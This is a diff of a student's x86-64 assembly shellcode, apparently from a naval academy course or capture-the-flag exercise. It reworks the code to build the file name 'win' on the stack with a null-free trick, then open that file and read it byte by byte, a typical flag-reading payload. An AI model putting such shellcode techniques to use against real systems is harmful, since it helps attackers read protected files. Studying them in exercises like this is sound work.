@@ -1,32 +1,26 @@
 ; Filename: shellcode.asm
 ; Author: MIDN 2/C Ian Coffey (m261194)
-; Copy from win
 
 ; Compilation Instructions...
 ; nasm -felf64 shellcode.asm -o shellcode.o
 ; ld shellcode.o -o shellcode
-; ./shellcode < something.txt
+; ./shellcode 
 
 bits 64 
-
-section .data:
-    win db 'win.txt'
 
 section .text
     global _start
 
 _start:
-    ; Open 'win.txt' file
     xor rax, rax
     inc rax
     inc rax
-    lea rdi, [win]
+    mov edi, "Xwin"
+    shr edi, 8
+    push rdi
+    mov rdi, rsp
     xor rsi, rsi
-    inc rsi
-    inc rsi
     xor rdx, rdx
-    inc rdx
-    inc rdx
     syscall
 
     ; Store fd in r8
@@ -50,7 +44,7 @@ _loop:
     sub rsp, rcx
 
     ; Setup syscall
-    mov rdi, r8   ; rdi = 'win.txt'
+    mov rdi, r8   ; rdi = 'win'
     mov rsi, rsp  ; location of buffer
     xor rax, rax  ; 0 = read(win, buffer, rdx=1)
     syscall       ; call read()
